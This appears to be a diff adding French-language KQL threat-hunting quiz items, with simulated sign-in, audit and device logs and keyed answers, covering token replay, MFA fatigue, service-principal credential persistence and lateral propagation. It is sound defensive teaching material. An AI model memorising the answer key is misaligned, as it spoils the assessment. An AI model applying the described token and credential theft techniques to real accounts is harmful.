+let Ops = datatable(TimeGenerated:datetime, Caller:string, OperationNameValue:string)
+[
+    datetime(2026-10-05T02:30:00Z), "ops.admin@contoso.com", "MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION",
+    datetime(2026-10-06T10:00:00Z), "ops.admin@contoso.com", "MICROSOFT.COMPUTE/VIRTUALMACHINES/START/ACTION",
+    datetime(2026-10-04T15:00:00Z), "dev.user@contoso.com",  "MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION"
+];
+Ops
+| extend Heure = hourofday(TimeGenerated), Jour = dayofweek(TimeGenerated) / 1d
+| where Heure < 7 or Heure >= 20 or Jour in (0, 6)
+| project TimeGenerated, Caller, OperationNameValue, Heure, Jour
+```
++: L'exécution de commande sur une VM à 02 h 30 le lundi 5 octobre et la lecture des clés de stockage le dimanche 4 octobre.
+-: Uniquement le démarrage de VM du mardi 6 octobre à 10 h. || Opération en heures ouvrées : exclue.
+-: Les trois opérations. || L'opération du mardi à 10 h ne remplit aucune condition.
+-: Aucune, car dayofweek() renvoie le nom du jour en texte. || dayofweek() renvoie un timespan (jours depuis le dimanche) ; divisé par 1d, on obtient 0 (dimanche) à 6 (samedi).
+=: **hourofday()** renvoie l'heure UTC (0–23) ; **dayofweek()** renvoie le nombre de jours écoulés depuis le dimanche précédent, sous forme de **timespan** (0d = dimanche, 6d = samedi). Les opérations `runCommand` (exécution de code sur une VM) et `listKeys` (lecture des clés d'un compte de stockage) hors heures ouvrées sont sensibles.
+T: Le 4 octobre 2026 est un dimanche (Jour = 0) et le 5 octobre un lundi (Jour = 1) : la première opération est retenue pour l'heure (2 h), la troisième pour le jour. Penser au fuseau horaire (UTC vs heure locale) et aux équipes d'astreinte légitimes.
+R: Deux lignes : RUNCOMMAND (Heure 2, Jour 1) et LISTKEYS (Heure 15, Jour 0).
+M: Croiser avec une watchlist des comptes d'astreinte et les fenêtres de maintenance planifiées.
+!: hourofday() = heure UTC ; dayofweek()/1d = 0 (dimanche) à 6 (samedi).
+
+### Rejeu de jeton depuis deux adresses
+@ niveau=A sub=hunt ref=kql-dcount,la-t-AADNonInteractive
+?: **Hypothèse de chasse :** un jeton de session volé est rejoué depuis une autre IP (AiTM). Sur ces connexions simulées partageant le même identifiant de session, laquelle est signalée ?
+```kql
+let Sessions = datatable(TimeGenerated:datetime, UserPrincipalName:string, SessionId:string, IPAddress:string, Location:string)
+[
+    datetime(2026-10-05T08:00:00Z), "r.faure@contoso.com", "sess-91a", "192.0.2.44",    "FR",
+    datetime(2026-10-05T08:07:00Z), "r.faure@contoso.com", "sess-91a", "203.0.113.150", "NL",
+    datetime(2026-10-05T08:20:00Z), "r.faure@contoso.com", "sess-91a", "203.0.113.150", "NL",
+    datetime(2026-10-05T09:00:00Z), "l.girard@contoso.com", "sess-77c", "192.0.2.45",   "FR",
+    datetime(2026-10-05T09:30:00Z), "l.girard@contoso.com", "sess-77c", "192.0.2.45",   "FR"
+];
+Sessions
+| summarize IPs = dcount(IPAddress), Pays = make_set(Location), Liste = make_set(IPAddress) by UserPrincipalName, SessionId
+| where IPs > 1
+```
++: La session sess-91a de r.faure, utilisée depuis la France puis, 7 minutes plus tard, depuis une IP aux Pays-Bas.
+-: La session sess-77c de l.girard. || Une seule IP pour toute la session : comportement normal.
+-: Les deux sessions, car elles contiennent plusieurs connexions. || Le critère porte sur le nombre d'IP distinctes par session, pas sur le nombre de connexions.
+-: Aucune, car un SessionId ne peut pas être partagé entre IP. || C'est précisément l'anomalie recherchée : le jeton volé est réutilisé ailleurs.
+=: Un même **identifiant de session** utilisé depuis **plusieurs IP** (et pays) en peu de temps suggère un **vol de cookie/jeton** rejoué par l'attaquant (T1539, T1550.004), typique des attaques AiTM.
+T: Les réseaux mobiles et les changements Wi-Fi/4G peuvent produire des changements d'IP légitimes, en général dans le même pays et chez le même opérateur. Dans SigninLogs/AADNonInteractiveUserSignInLogs, utilisez SessionId ; Entra ID Protection détecte « Anomalous token » et « Attacker in the Middle ».
+R: r.faure@contoso.com | sess-91a | 2 | [FR, NL] | [192.0.2.44, 203.0.113.150].
+M: Inclure AADNonInteractiveUserSignInLogs (le rejeu de jeton y apparaît souvent) et ajouter l'ASN/opérateur via `geo_info_from_ip_address()`.
+!: Même SessionId depuis plusieurs IP/pays = rejeu de jeton probable (AiTM).
+
+### Ajout d'identifiants à un principal de service
+@ niveau=A sub=hunt ref=la-t-AuditLogs,kql-dynamic
+?: **Hypothèse de chasse :** un attaquant ajoute un secret à une application à privilèges pour persister (T1098.001). Quelle requête renvoie l'opération et son auteur à partir de ces événements d'audit simulés ?
+```kql
+let Audit = datatable(TimeGenerated:datetime, OperationName:string, Result:string, InitiatedBy:dynamic, TargetResources:dynamic)
+[
+    datetime(2026-10-05T04:12:00Z), "Add service principal credentials", "success",
+        dynamic({"user":{"userPrincipalName":"it.contractor@contoso.com","ipAddress":"203.0.113.66"}}),
+        dynamic([{"displayName":"App-Paie-Graph","type":"ServicePrincipal"}]),
+    datetime(2026-10-05T10:00:00Z), "Update user", "success",
+        dynamic({"user":{"userPrincipalName":"rh.admin@contoso.com","ipAddress":"192.0.2.20"}}),
+        dynamic([{"displayName":"Nadia Roche","type":"User"}])
+];
+Audit
+| where OperationName has_any ("Add service principal credentials", "Update application – Certificates and secrets management")
+| extend Auteur = tostring(InitiatedBy.user.userPrincipalName), IP = tostring(InitiatedBy.user.ipAddress), Application = tostring(TargetResources[0].displayName)
+| project TimeGenerated, OperationName, Auteur, IP, Application
+```
++: Une ligne : l'ajout d'identifiants à « App-Paie-Graph » par it.contractor@contoso.com depuis 203.0.113.66 à 04 h 12.
+-: Une ligne : la mise à jour de l'utilisateur Nadia Roche. || L'opération « Update user » n'est pas filtrée.
+-: Deux lignes. || Seule l'opération d'ajout d'identifiants correspond au filtre.
+-: Aucune ligne, car InitiatedBy est dynamique. || La notation pointée suivie de `tostring()` extrait la valeur sans difficulté.
+=: L'ajout de **secrets ou certificats** à une application ou un principal de service (« Add service principal credentials », « Update application – Certificates and secrets management ») permet à un attaquant de s'authentifier comme l'application, souvent avec des permissions Graph élevées, indépendamment des utilisateurs.
+T: Dans AuditLogs réels, `InitiatedBy` peut contenir `user` ou `app` ; `TargetResources[0].modifiedProperties` détaille les identifiants ajoutés (KeyType, KeyUsage). Investiguer ensuite les connexions du principal de service (AADServicePrincipalSignInLogs) et ses appels Graph (MicrosoftGraphActivityLogs).
+R: 04:12 | Add service principal credentials | it.contractor@contoso.com | 203.0.113.66 | App-Paie-Graph.
+M: Prioriser les applications disposant de permissions sensibles (Mail.ReadWrite, Directory.ReadWrite.All, RoleManagement.ReadWrite.Directory).
+!: Persistance applicative = ajout d'identifiants à une application (AuditLogs) → vérifier ses connexions et appels Graph.
+
+### Série temporelle et anomalie de connexions
+@ niveau=A sub=hunt ref=kql-make-series,kql-anomalies
+?: **Hypothèse de chasse :** un pic d'échecs de connexion révèle une attaque. Sur la série horaire simulée ci-dessous, quel est l'intérêt de `series_decompose_anomalies` par rapport à un seuil fixe ?
+```kql
+let Echecs = datatable(Heure:datetime, Nombre:long)
+[
+    datetime(2026-10-05T00:00:00Z), 12, datetime(2026-10-05T01:00:00Z), 10, datetime(2026-10-05T02:00:00Z), 11,
+    datetime(2026-10-05T03:00:00Z), 13, datetime(2026-10-05T04:00:00Z), 9,  datetime(2026-10-05T05:00:00Z), 12,
+    datetime(2026-10-05T06:00:00Z), 14, datetime(2026-10-05T07:00:00Z), 11, datetime(2026-10-05T08:00:00Z), 160,
+    datetime(2026-10-05T09:00:00Z), 12, datetime(2026-10-05T10:00:00Z), 10, datetime(2026-10-05T11:00:00Z), 13
+];
+Echecs
+| make-series Serie = sum(Nombre) default = 0 on Heure from datetime(2026-10-05T00:00:00Z) to datetime(2026-10-05T12:00:00Z) step 1h
+| extend (Anomalies, Score, Base) = series_decompose_anomalies(Serie, 1.5, 0, "avg")
+| mv-expand Heure to typeof(datetime), Serie to typeof(long), Anomalies to typeof(int)
+| where Anomalies == 1
+```
++: La fonction compare chaque point à la tendance apprise de la série : le pic de 160 échecs à 08 h ressort comme anomalie positive sans qu'il faille fixer un seuil absolu adapté à chaque environnement.
+-: Elle supprime le pic de 08 h comme valeur aberrante. || Elle signale le pic (Anomalies = 1), elle ne le supprime pas.
+-: Elle ne fonctionne qu'avec des données de plus d'un an. || Elle fonctionne sur des séries courtes ; la détection de saisonnalité s'améliore avec plus d'historique.
+-: Elle renvoie le nombre total d'échecs. || Elle renvoie trois séries : indicateur d'anomalie, score et valeur de base.
+=: **series_decompose_anomalies** modélise la série (base, saisonnalité, tendance) et marque les points dont l'écart (résidu) dépasse le seuil de sensibilité (ici 1.5). Les paramètres `0` (pas de saisonnalité, série trop courte) et `"avg"` (tendance = moyenne) rendent le calcul déterministe sur cet extrait. Le pic de **160** à 08 h, face à une base d'environ 11, est marqué **+1** : la détection s'adapte au niveau habituel de chaque série.
+T: Combiné à `make-series ... by Utilisateur` ou `by IP`, on obtient une détection d'anomalie par entité, comme le font les règles d'anomalie de Sentinel. Choisir le seuil (1.5 = sensible, 3 = strict) en fonction du bruit acceptable.
+R: Une ligne : 2026-10-05T08:00 | 160 | 1.
+M: Exécuter la même logique par application ou par pays pour localiser la source du pic.
+!: Seuil adaptatif = make-series + series_decompose_anomalies (+1 pic, -1 creux).
+
+### Fatigue MFA dans des journaux simulés
+@ niveau=I sub=hunt ref=la-t-SigninLogs,entra-error-codes
+?: **Hypothèse de chasse :** un attaquant bombarde un utilisateur de notifications MFA jusqu'à acceptation. Que renvoie la requête sur ces journaux simulés ?
+```kql
+let Mfa = datatable(TimeGenerated:datetime, UserPrincipalName:string, IPAddress:string, ResultType:string)
+[
+    datetime(2026-10-05T23:01:00Z), "h.marchand@contoso.com", "203.0.113.90", "500121",
+    datetime(2026-10-05T23:02:00Z), "h.marchand@contoso.com", "203.0.113.90", "500121",
+    datetime(2026-10-05T23:03:00Z), "h.marchand@contoso.com", "203.0.113.90", "500121",
+    datetime(2026-10-05T23:04:00Z), "h.marchand@contoso.com", "203.0.113.90", "500121",
+    datetime(2026-10-05T23:05:00Z), "h.marchand@contoso.com", "203.0.113.90", "0",
+    datetime(2026-10-05T09:00:00Z), "o.perrin@contoso.com",   "192.0.2.80",   "500121",
+    datetime(2026-10-05T09:01:00Z), "o.perrin@contoso.com",   "192.0.2.80",   "0"
+];
+Mfa
+| summarize Refus = countif(ResultType == "500121"), Succes = countif(ResultType == "0"), DernierRefus = maxif(TimeGenerated, ResultType == "500121"), PremierSucces = minif(TimeGenerated, ResultType == "0") by UserPrincipalName, IPAddress
+| where Refus >= 3 and Succes > 0 and PremierSucces > DernierRefus
+```
++: h.marchand@contoso.com depuis 203.0.113.90 : 4 refus MFA nocturnes suivis d'un succès.
+-: o.perrin@contoso.com. || Un seul refus suivi d'un succès : erreur ponctuelle plausible, sous le seuil de 3 refus.
+-: Les deux utilisateurs. || o.perrin ne remplit pas la condition `Refus >= 3`.
+-: Aucun, car `maxif` n'existe pas. || `maxif()` et `minif()` sont des agrégations conditionnelles valides.
+=: Les agrégations conditionnelles (**countif**, **maxif**, **minif**) permettent, dans un seul `summarize`, de compter les refus MFA (**500121**), les succès et de vérifier qu'un succès **suit** la rafale de refus : signature d'une **fatigue MFA** réussie (T1621).
+T: La correspondance de nombres (number matching) et l'affichage du contexte (application, lieu) dans Microsoft Authenticator réduisent fortement ce risque. Réponse : révoquer les sessions, réinitialiser le mot de passe (l'attaquant le connaît), vérifier les méthodes MFA enregistrées.
+R: h.marchand@contoso.com | 203.0.113.90 | 4 | 1 | 23:04 | 23:05.
+M: Ajouter un filtre sur les heures inhabituelles et la nouveauté de l'IP pour l'utilisateur.
+!: Fatigue MFA = plusieurs 500121 puis succès (countif/maxif/minif).
+
+### Compte de service utilisé de manière interactive
+@ niveau=I sub=hunt ref=xdr-t-DeviceLogonEvents,kql-in
+?: **Hypothèse de chasse :** un attaquant utilise les identifiants d'un compte de service pour ouvrir des sessions interactives (T1078). Sur les ouvertures de session simulées, que renvoie la requête ?
+```kql
+let Logons = datatable(TimeGenerated:datetime, AccountName:string, DeviceName:string, LogonType:string, RemoteIP:string)
+[
+    datetime(2026-10-05T02:00:00Z), "svc_backup", "SRV-BKP01", "Service",          "",
+    datetime(2026-10-05T02:05:00Z), "svc_backup", "SRV-FIC01", "Network",          "10.0.1.20",
+    datetime(2026-10-05T14:22:00Z), "svc_backup", "SRV-DC01",  "RemoteInteractive", "10.0.8.77",
+    datetime(2026-10-05T09:00:00Z), "n.robin",    "PC-0042",   "Interactive",       ""
+];
+Logons
+| where AccountName startswith "svc_"
+| where LogonType in ("Interactive", "RemoteInteractive")
+| project TimeGenerated, AccountName, DeviceName, LogonType, RemoteIP
+```
++: Une ligne : svc_backup ouvrant une session RDP (RemoteInteractive) sur le contrôleur de domaine SRV-DC01 depuis 10.0.8.77.
+-: Deux lignes pour svc_backup : Service et Network. || Ces types d'ouverture de session sont attendus pour un compte de service et sont exclus par le filtre.
+-: La ligne de n.robin, car elle est interactive. || n.robin ne commence pas par « svc_ » : utilisateur standard.
+-: Aucune ligne, car RemoteInteractive n'est pas une ouverture de session interactive. || Le filtre inclut explicitement RemoteInteractive (RDP).
+=: Un **compte de service** ne devrait ouvrir que des sessions de type **Service**, **Batch** ou **Network**. Une session **interactive** ou **RDP**, de surcroît sur un **contrôleur de domaine** et depuis un poste quelconque, indique l'usage abusif d'identifiants valides (T1078.002) — souvent après un Kerberoasting.
+T: La convention de nommage (« svc_ ») est une hypothèse : en production, s'appuyer sur une watchlist des comptes de service ou sur IdentityInfo (`IsServiceAccount`). Prévention : refuser l'ouverture de session interactive et RDP aux comptes de service par GPO, utiliser des gMSA.
+R: 14:22 | svc_backup | SRV-DC01 | RemoteInteractive | 10.0.8.77.
+S: Sur DeviceLogonEvents réel, LogonType est une chaîne ; dans SecurityEvent, utiliser les codes 2 et 10.
+M: Croiser avec l'alerte MDI de Kerberoasting et avec les processus lancés dans la session (InitiatingProcessLogonId).
+!: Compte de service + session interactive/RDP = usage abusif d'identifiants.
+
+### Fichier déposé puis exécuté sur plusieurs postes
+@ niveau=A sub=hunt ref=kql-join,xdr-t-DeviceFileEvents
+?: **Hypothèse de chasse :** un même binaire est copié via le partage administratif puis exécuté sur plusieurs postes (propagation latérale, T1570). Que renvoie la requête sur ces événements simulés ?
+```kql
+let Fichiers = datatable(TimeGenerated:datetime, DeviceName:string, SHA256:string, FolderPath:string)
+[
+    datetime(2026-10-05T12:00:00Z), "PC-101", "aa11", @"C:\Windows\Temp\upd.exe",
+    datetime(2026-10-05T12:00:30Z), "PC-102", "aa11", @"C:\Windows\Temp\upd.exe",
+    datetime(2026-10-05T12:01:00Z), "PC-103", "aa11", @"C:\Windows\Temp\upd.exe",
+    datetime(2026-10-05T12:30:00Z), "PC-104", "bb22", @"C:\Users\lea\Downloads\menu.pdf"
+];
+let Executions = datatable(TimeGenerated:datetime, DeviceName:string, SHA256:string)
+[
+    datetime(2026-10-05T12:00:10Z), "PC-101", "aa11",
+    datetime(2026-10-05T12:00:40Z), "PC-102", "aa11",
+    datetime(2026-10-05T12:01:15Z), "PC-103", "aa11"
+];
+Fichiers
+| join kind=inner (Executions | project ExecTime = TimeGenerated, DeviceName, SHA256) on DeviceName, SHA256
+| where ExecTime between (TimeGenerated .. TimeGenerated + 5m)
+| summarize Postes = dcount(DeviceName), Liste = make_set(DeviceName) by SHA256, FolderPath
+| where Postes >= 3
+```
++: Le hachage aa11 (C:\Windows\Temp\upd.exe), déposé puis exécuté sur 3 postes en environ une minute.
+-: Le hachage bb22 (menu.pdf). || Aucun événement d'exécution correspondant et un seul poste.
+-: Les deux hachages. || bb22 est éliminé par la jointure interne.
+-: Aucun, car la jointure sur deux colonnes est impossible. || La clause `on` accepte plusieurs colonnes communes.
+=: La jointure sur **(DeviceName, SHA256)** associe le dépôt et l'exécution du **même fichier sur le même poste**, la contrainte temporelle (5 minutes) caractérise un enchaînement automatisé, et `dcount(DeviceName) >= 3` la **propagation** sur plusieurs postes.
+T: En données réelles : DeviceFileEvents (FileCreated, souvent par System via SMB : `RequestProtocol == "SMB"`, `RequestSourceIP`) et DeviceProcessEvents (SHA256 du processus créé). Le dossier `C:\Windows\Temp` ou le partage ADMIN$ sont typiques de PsExec et d'outils de déploiement malveillants.
+R: aa11 | C:\Windows\Temp\upd.exe | 3 | [PC-101, PC-102, PC-103].
+S: Les hachages sont abrégés dans l'extrait simulé ; en réalité, SHA256 comporte 64 caractères hexadécimaux.
+M: Ajouter RequestSourceIP pour identifier la machine source de la copie (patient zéro) et vérifier la prévalence mondiale du hachage (FileProfile).
+!: Dépôt + exécution du même hachage sur plusieurs postes en peu de temps = propagation latérale.
